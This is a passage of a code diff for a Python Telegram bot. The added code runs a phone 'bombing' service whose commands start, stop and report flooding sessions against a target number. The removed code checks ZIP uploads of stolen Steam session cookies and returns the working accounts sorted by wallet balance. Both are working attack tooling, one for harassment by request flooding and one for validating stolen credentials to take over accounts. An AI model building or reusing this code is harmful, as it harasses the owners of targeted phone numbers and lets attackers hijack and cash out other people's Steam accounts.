+        f"Use `/stats` to see live progress.",
+        parse_mode="Markdown"
+    )
+
+async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    if chat_id not in active_sessions:
+        await update.message.reply_text("ℹ️ You don't have an active bombing session.")
+        return
+
+    session = active_sessions[chat_id]
+    bomber = session["bomber"]
+    bomber.stop()
+    # Remove from dict (thread will also remove when it ends)
+    if chat_id in active_sessions:
+        del active_sessions[chat_id]
+
+    await update.message.reply_text(
+        f"🛑 *Bombing stopped!*\n"
+        f"📱 Target: `{session['phone']}`\n"
+        f"📡 Mode: `{session['mode']}`\n"
+        f"🔴 All requests halted.",
+        parse_mode="Markdown"
+    )
+
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    if chat_id not in active_sessions:
+        await update.message.reply_text("ℹ️ No active bombing session.")
+        return
+
+    session = active_sessions[chat_id]
+    bomber = session["bomber"]
+    running = bomber.running
+    status_text = "🟢 Running" if running else "🔴 Stopped"
+    total = bomber.stats["total"]
+    await update.message.reply_text(
+        f"📊 *Session Status*\n"
+        f"📱 Target: `{session['phone']}`\n"
+        f"📡 Mode: `{session['mode']}`\n"
+        f"🔄 Status: {status_text}\n"
+        f"📨 Requests sent: {total['sent']}\n"
+        f"✅ Success: {total['success']}\n"
+        f"❌ Failed: {total['fail']}",
+        parse_mode="Markdown"
+    )
+
+async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    if chat_id not in active_sessions:
+        await update.message.reply_text("ℹ️ No active bombing session.")
+        return
+
+    bomber = active_sessions[chat_id]["bomber"]
+    stats_text = bomber.get_stats()
+    # Split if too long for Telegram (max 4096 chars)
+    if len(stats_text) > 4000:
+        parts = [stats_text[i:i+4000] for i in range(0, len(stats_text), 4000)]
+        for part in parts:
+            await update.message.reply_text(part, parse_mode="Markdown")
+    else:
+        await update.message.reply_text(stats_text, parse_mode="Markdown")
+
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await start(update, context)
+
+# -------------------- Flask Web Server --------------------
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
@@ -608,210 +441,30 @@ def run_flask():
     port = int(os.environ.get("PORT", 8080))
     flask_app.run(host="0.0.0.0", port=port)
 
-def group_hits_by_balance(hits):
-    groups = {"0-1": [], "1-5": [], "5-10": [], "10-200": [], "others": []}
-    for bal, username, steamid, content in hits:
-        if bal <= 1:
-            groups["0-1"].append((bal, username, steamid, content))
-        elif bal <= 5:
-            groups["1-5"].append((bal, username, steamid, content))
-        elif bal <= 10:
-            groups["5-10"].append((bal, username, steamid, content))
-        elif bal <= 200:
-            groups["10-200"].append((bal, username, steamid, content))
-        else:
-            groups["others"].append((bal, username, steamid, content))
-    return groups
-
-def create_zip_from_hits(hits, range_name):
-    if not hits:
-        return None
-    zip_buffer = BytesIO()
-    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
-        for idx, (bal, username, steamid, content) in enumerate(hits, 1):
-            safe_username = "".join(c for c in username if c.isalnum() or c in " _-")
-            filename = f"{range_name}/{safe_username}_{steamid}.txt"
-            zf.writestr(filename, content)
-    zip_buffer.seek(0)
-    return zip_buffer
-
-class ProgressTracker:
-    def __init__(self, total):
-        self.total = total
-        self.processed = 0
-        self.valid = 0
-        self.invalid = 0
-        self.lock = Lock()
-        self.done = False
-
-def process_cookies_with_progress(cookie_list, tracker, batch_size=200):
-    valid_hits = []
-    total_cookies = len(cookie_list)
-
-    for start in range(0, total_cookies, batch_size):
-        batch = cookie_list[start:start+batch_size]
-        checkers = []
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = []
-            for cookies, filepath in batch:
-                checker = SteamChecker(cookies, filepath, 0)
-                checkers.append(checker)
-                futures.append(executor.submit(checker.check))
-            for future in as_completed(futures):
-                success = future.result()
-                with tracker.lock:
-                    tracker.processed += 1
-                    if success:
-                        tracker.valid += 1
-                    else:
-                        tracker.invalid += 1
-
-        for checker in checkers:
-            if checker.success:
-                content = generate_hit_content(checker)
-                valid_hits.append((checker.balance_float, checker.username, checker.steamid, content))
-        del checkers
-
-    tracker.done = True
-    return valid_hits
-
-async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    document = update.message.document
-    if not document or not document.file_name.endswith('.zip'):
-        await update.message.reply_text("Please send a ZIP file containing cookie files (.txt or .json).")
-        return
-
-    status_msg = await update.message.reply_text("⏳ Downloading and extracting...")
-
-    try:
-        file = await context.bot.get_file(document.file_id)
-        zip_path = f"/tmp/{document.file_id}.zip"
-        await file.download_to_drive(zip_path)
-
-        extract_dir = tempfile.mkdtemp()
-        with zipfile.ZipFile(zip_path, 'r') as zf:
-            zf.extractall(extract_dir)
-
-        cookie_files = []
-        for root, _, files in os.walk(extract_dir):
-            for f in files:
-                if f.endswith(('.txt', '.json')):
-                    cookie_files.append(os.path.join(root, f))
-
-        if not cookie_files:
-            await status_msg.edit_text("❌ No cookie files (.txt or .json) found in the ZIP.")
-            shutil.rmtree(extract_dir)
-            os.remove(zip_path)
-            return
-
-        all_cookies = []
-        for filepath in cookie_files:
-            cookies = load_cookies(filepath)
-            if cookies:
-                essential_names = {'steamLoginSecure', 'steamRefresh_steam'}
-                has_essential = any(c.get('name') in essential_names for c in cookies)
-                if has_essential:
-                    all_cookies.append((cookies, filepath))
-
-        if not all_cookies:
-            await status_msg.edit_text("❌ Failed to load any valid cookies from the files. Ensure they contain 'steamLoginSecure' or 'steamRefresh_steam'.")
-            shutil.rmtree(extract_dir)
-            os.remove(zip_path)
-            return
-
-        total = len(all_cookies)
-        await status_msg.edit_text(f"✅ Loaded {total} cookie sets. Starting check...")
-
-        tracker = ProgressTracker(total)
-        loop = asyncio.get_running_loop()
-
-        processing_future = loop.run_in_executor(None, process_cookies_with_progress, all_cookies, tracker, 200)
-
-        last_text = ""
-        async def status_updater():
-            nonlocal last_text
-            while not tracker.done:
-                with tracker.lock:
-                    processed = tracker.processed
-                    valid = tracker.valid
-                    invalid = tracker.invalid
-                new_text = f"🔄 Checking... {processed}/{total} | ✅ Valid: {valid} | ❌ Invalid: {invalid}"
-                if new_text != last_text:
-                    try:
-                        await status_msg.edit_text(new_text)
-                        last_text = new_text
-                    except Exception:
-                        pass
-                await asyncio.sleep(1)
-            with tracker.lock:
-                processed = tracker.processed
-                valid = tracker.valid
-                invalid = tracker.invalid
-            final_text = f"✅ Checking completed: {total} total, {valid} valid, {invalid} invalid."
-            if final_text != last_text:
-                try:
-                    await status_msg.edit_text(final_text)
-                except Exception:
-                    pass
-
-        await asyncio.gather(processing_future, status_updater())
-
-        valid_hits = processing_future.result()
-
-        if not valid_hits:
-            await update.message.reply_text("❌ No valid Steam accounts found.")
-            shutil.rmtree(extract_dir)
-            os.remove(zip_path)
-            return
-
-        groups = group_hits_by_balance(valid_hits)
-        sent = 0
-        for range_name, hits in groups.items():
-            if not hits:
-                continue
-            zip_buffer = create_zip_from_hits(hits, range_name)
-            if zip_buffer:
-                await update.message.reply_document(
-                    document=zip_buffer,
-                    filename=f"steam_hits_{range_name}.zip",
-                    caption=f"✅ {len(hits)} accounts with balance {range_name} {('(including others)' if range_name=='others' else '')}"
-                )
-                sent += 1
-        if sent == 0:
-            await update.message.reply_text("No groups to send? (Unexpected)")
-
-        shutil.rmtree(extract_dir)
-        os.remove(zip_path)
-
-    except Exception as e:
-        await status_msg.edit_text(f"❌ Error: {str(e)}")
-        try:
-            shutil.rmtree(extract_dir)
-        except:
-            pass
-        try:
-            os.remove(zip_path)
-        except:
-            pass
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 Send me a ZIP file containing Steam cookie files (JSON or Netscape .txt).\n"
-        "I will check each cookie and send back valid accounts grouped by balance ranges.\n"
-        "Balance ranges: 0-1, 1-5, 5-10, 10-200 (and others).\n"
-        "Currency symbols are detected automatically."
-    )
-
+# -------------------- Main --------------------
 def main():
-    flask_thread = Thread(target=run_flask, daemon=True)
-    flask_thread.start()
+    # Start Flask in background
+    threading.Thread(target=run_flask, daemon=True).start()
+    print("[INFO] Flask server started.")
 
-    application = Application.builder().token(BOT_TOKEN).build()
+    # Initialize Telegram bot
+    application = Application.builder().token(TELEGRAM_TOKEN).build()
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("bomb", bomb))
+    application.add_handler(CommandHandler("stop", stop))
+    application.add_handler(CommandHandler("status", status))
+    application.add_handler(CommandHandler("stats", stats))
 
-    print("Bot started. Press Ctrl+C to stop.")
-    application.run_polling()
+    print("[INFO] Telegram bot started polling...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[INFO] Bot stopped by user.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"[FATAL ERROR] {e}")
+        sys.exit(1)
